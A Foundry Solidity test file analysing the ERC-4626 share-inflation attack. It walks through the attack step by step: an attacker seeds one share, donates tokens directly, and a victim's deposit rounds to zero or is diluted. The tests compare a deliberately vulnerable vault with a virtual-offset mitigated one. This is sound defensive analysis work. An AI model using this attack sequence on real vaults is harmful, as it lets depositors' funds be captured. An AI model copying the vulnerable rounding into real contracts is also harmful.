// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";

import {MockERC20} from "../src/MockERC20.sol";
import {VulnerableVault} from "../src/VulnerableVault.sol";
import {SafeVirtualOffsetVault} from "../src/SafeVirtualOffsetVault.sol";

contract ERC4626InflationAnalysisTest is Test {
    MockERC20 internal asset;
    VulnerableVault internal vulnerableVault;
    SafeVirtualOffsetVault internal safeVault;

    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");
    address internal referenceUser = makeAddr("referenceUser");

    uint256 internal constant ATTACKER_SEED = 1;
    uint256 internal constant DONATION = 100e18;
    uint256 internal constant VICTIM_DEPOSIT = 100e18;

    function setUp() public {
        asset = new MockERC20("Mock Asset", "MOCK", 18);
        vulnerableVault = new VulnerableVault(asset);
        safeVault = new SafeVirtualOffsetVault(asset);

        asset.mint(attacker, 1_000_000e18);
        asset.mint(victim, 1_000_000e18);
        asset.mint(referenceUser, 1_000_000e18);

        vm.prank(attacker);
        asset.approve(address(vulnerableVault), type(uint256).max);

        vm.prank(victim);
        asset.approve(address(vulnerableVault), type(uint256).max);

        vm.prank(referenceUser);
        asset.approve(address(vulnerableVault), type(uint256).max);

        vm.prank(attacker);
        asset.approve(address(safeVault), type(uint256).max);

        vm.prank(victim);
        asset.approve(address(safeVault), type(uint256).max);

        vm.prank(referenceUser);
        asset.approve(address(safeVault), type(uint256).max);
    }

    function test_minAssetsRequiredForOneShareAfterDonation() public {
        // Attacker creates the thinnest possible real share supply:
        // totalSupply = 1, totalAssets = 1.
        vm.prank(attacker);
        vulnerableVault.deposit(ATTACKER_SEED, attacker);

        assertEq(vulnerableVault.totalSupply(), 1, "initial share supply should be one");
        assertEq(vulnerableVault.totalAssets(), 1, "initial assets should be one");

        // Direct donation increases assets but does not mint shares.
        vm.prank(attacker);
        asset.transfer(address(vulnerableVault), DONATION);

        assertEq(vulnerableVault.totalSupply(), 1, "donation should not mint shares");
        assertEq(vulnerableVault.totalAssets(), DONATION + ATTACKER_SEED, "assets should include donation");

        // With floor division:
        //
        // shares = assets * totalSupply / totalAssets
        //
        // Given totalSupply = 1:
        //
        // shares = assets / totalAssets
        //
        // Therefore the minimum deposit to mint one share is exactly totalAssets.
        uint256 minAssetsForOneShare = vulnerableVault.totalAssets() / vulnerableVault.totalSupply();

        assertEq(minAssetsForOneShare, DONATION + ATTACKER_SEED, "threshold should equal assets per share");

        assertEq(
            vulnerableVault.previewDeposit(minAssetsForOneShare - 1),
            0,
            "deposit below threshold should mint zero shares"
        );

        assertEq(
            vulnerableVault.previewDeposit(minAssetsForOneShare),
            1,
            "deposit at threshold should mint one share"
        );

        assertEq(
            vulnerableVault.previewDeposit(minAssetsForOneShare + 1),
            1,
            "deposit just above threshold should still mint one share"
        );

        assertEq(
            vulnerableVault.previewDeposit(2 * minAssetsForOneShare),
            2,
            "deposit at two times threshold should mint two shares"
        );
    }

    function test_directDonationCreatesExtremeAssetShareRatio() public {
        vm.prank(attacker);
        vulnerableVault.deposit(ATTACKER_SEED, attacker);

        uint256 assetsPerShareBeforeDonation = vulnerableVault.convertToAssets(1);

        assertEq(assetsPerShareBeforeDonation, 1, "one share should initially claim one asset");

        vm.prank(attacker);
        asset.transfer(address(vulnerableVault), DONATION);

        uint256 assetsPerShareAfterDonation = vulnerableVault.convertToAssets(1);

        assertEq(
            assetsPerShareAfterDonation,
            DONATION + ATTACKER_SEED,
            "one share should claim the entire donated balance"
        );

        assertGt(
            assetsPerShareAfterDonation,
            assetsPerShareBeforeDonation,
            "donation should increase assets per share"
        );

        assertEq(vulnerableVault.totalSupply(), 1, "share supply remains thin");
        assertEq(vulnerableVault.balanceOf(attacker), 1, "attacker owns the only share");
    }

    function test_vaultCanBeSolventWhileVictimOwnershipIsZero() public {
        vm.prank(attacker);
        vulnerableVault.deposit(ATTACKER_SEED, attacker);

        vm.prank(attacker);
        asset.transfer(address(vulnerableVault), DONATION);

        vm.prank(victim);
        uint256 victimShares = vulnerableVault.deposit(VICTIM_DEPOSIT, victim);

        // The vault has the victim's assets.
        assertEq(
            asset.balanceOf(address(vulnerableVault)),
            ATTACKER_SEED + DONATION + VICTIM_DEPOSIT,
            "vault should hold all assets"
        );

        // But the victim owns no claim.
        assertEq(victimShares, 0, "victim should receive zero shares");
        assertEq(vulnerableVault.balanceOf(victim), 0, "victim should own no vault shares");

        // The vault is solvent in a raw-balance sense, but ownership is misallocated.
        assertGt(asset.balanceOf(address(vulnerableVault)), 0, "vault has assets");
        assertEq(vulnerableVault.totalSupply(), 1, "only attacker share exists");
        assertEq(vulnerableVault.balanceOf(attacker), 1, "attacker owns 100% of shares");
    }

    function test_partialDilutionVictimReceivesNonZeroButUnfairShares() public {
        // This test shows that zero-share minting is the extreme case.
        // More generally, direct donations can make later deposits receive fewer shares
        // than they would have received without the donation.

        uint256 attackerSeed = 1e18;
        uint256 donation = 100e18;
        uint256 victimDeposit = 100e18;

        // Baseline vault without donation.
        MockERC20 baselineAsset = new MockERC20("Baseline Asset", "BASE", 18);
        VulnerableVault baselineVault = new VulnerableVault(baselineAsset);

        baselineAsset.mint(attacker, attackerSeed);
        baselineAsset.mint(victim, victimDeposit);

        vm.prank(attacker);
        baselineAsset.approve(address(baselineVault), type(uint256).max);

        vm.prank(victim);
        baselineAsset.approve(address(baselineVault), type(uint256).max);

        vm.prank(attacker);
        baselineVault.deposit(attackerSeed, attacker);

        uint256 victimSharesWithoutDonation = baselineVault.previewDeposit(victimDeposit);

        vm.prank(victim);
        baselineVault.deposit(victimDeposit, victim);

        // Donation vault with the same attacker seed and victim deposit.
        MockERC20 donationAsset = new MockERC20("Donation Asset", "DON", 18);
        VulnerableVault donationVault = new VulnerableVault(donationAsset);

        donationAsset.mint(attacker, attackerSeed + donation);
        donationAsset.mint(victim, victimDeposit);

        vm.prank(attacker);
        donationAsset.approve(address(donationVault), type(uint256).max);

        vm.prank(victim);
        donationAsset.approve(address(donationVault), type(uint256).max);

        vm.prank(attacker);
        donationVault.deposit(attackerSeed, attacker);

        vm.prank(attacker);
        donationAsset.transfer(address(donationVault), donation);

        uint256 victimSharesWithDonation = donationVault.previewDeposit(victimDeposit);

        vm.prank(victim);
        donationVault.deposit(victimDeposit, victim);

        assertGt(victimSharesWithoutDonation, 0, "baseline victim should receive shares");
        assertGt(victimSharesWithDonation, 0, "victim still receives nonzero shares in this scenario");

        assertLt(
            victimSharesWithDonation,
            victimSharesWithoutDonation,
            "donation should dilute victim's share minting"
        );

        // In the baseline case:
        // attackerSeed = 1e18, victimDeposit = 100e18, assets/share = 1
        // victim should receive 100e18 shares.
        assertEq(victimSharesWithoutDonation, victimDeposit, "baseline should mint 1:1 shares");

        // In the donation case:
        // totalSupply = 1e18
        // totalAssets = 101e18
        // victimDeposit = 100e18
        //
        // victimShares = 100e18 * 1e18 / 101e18
        //              ~= 0.990099e18
        //
        // This is nonzero, but dramatically lower than the 100e18 baseline.
        assertEq(
            victimSharesWithDonation,
            victimDeposit * attackerSeed / (attackerSeed + donation),
            "donation case should match floor-rounded conversion"
        );
    }

    function test_safeVirtualOffsetDoesNotIgnoreDonationButBoundsEffect() public {
        vm.prank(attacker);
        uint256 attackerShares = safeVault.deposit(ATTACKER_SEED, attacker);

        assertGt(attackerShares, 0, "attacker should receive nonzero shares");

        uint256 assetsPerOneVirtualUnitBefore = safeVault.convertToAssets(1e18);

        vm.prank(attacker);
        asset.transfer(address(safeVault), DONATION);

        uint256 assetsPerOneVirtualUnitAfter = safeVault.convertToAssets(1e18);

        // Important: virtual offset does not ignore donation.
        // totalAssets still reads live token balance, so donation moves the exchange rate.
        assertGt(
            assetsPerOneVirtualUnitAfter,
            assetsPerOneVirtualUnitBefore,
            "donation should still increase exchange rate"
        );

        // But the victim is not rounded to zero under the same attack setup.
        uint256 victimPreviewShares = safeVault.previewDeposit(VICTIM_DEPOSIT);

        assertGt(
            victimPreviewShares,
            0,
            "virtual offset should preserve nonzero victim share minting"
        );

        vm.prank(victim);
        uint256 victimShares = safeVault.deposit(VICTIM_DEPOSIT, victim);

        assertEq(victimShares, victimPreviewShares, "deposit should match preview");
        assertGt(safeVault.balanceOf(victim), 0, "victim should own shares");
    }

    function test_safeVirtualOffsetRaisesEffectiveSupplyUnderLowRealSupply() public {
        vm.prank(attacker);
        uint256 attackerShares = safeVault.deposit(ATTACKER_SEED, attacker);

        vm.prank(attacker);
        asset.transfer(address(safeVault), DONATION);

        uint256 realSupply = safeVault.totalSupply();
        uint256 effectiveSupply = safeVault.totalSupply() + safeVault.VIRTUAL_SHARES();

        assertEq(realSupply, attackerShares, "real supply should equal attacker shares");
        assertGt(effectiveSupply, realSupply, "effective supply should include virtual shares");

        uint256 vulnerablePreview;
        uint256 safePreview;

        // Recreate same setup in vulnerable vault for direct comparison.
        vm.prank(attacker);
        vulnerableVault.deposit(ATTACKER_SEED, attacker);

        vm.prank(attacker);
        asset.transfer(address(vulnerableVault), DONATION);

        vulnerablePreview = vulnerableVault.previewDeposit(VICTIM_DEPOSIT);
        safePreview = safeVault.previewDeposit(VICTIM_DEPOSIT);

        assertEq(vulnerablePreview, 0, "vulnerable vault should round victim to zero");
        assertGt(safePreview, 0, "safe vault should mint nonzero shares");
    }
}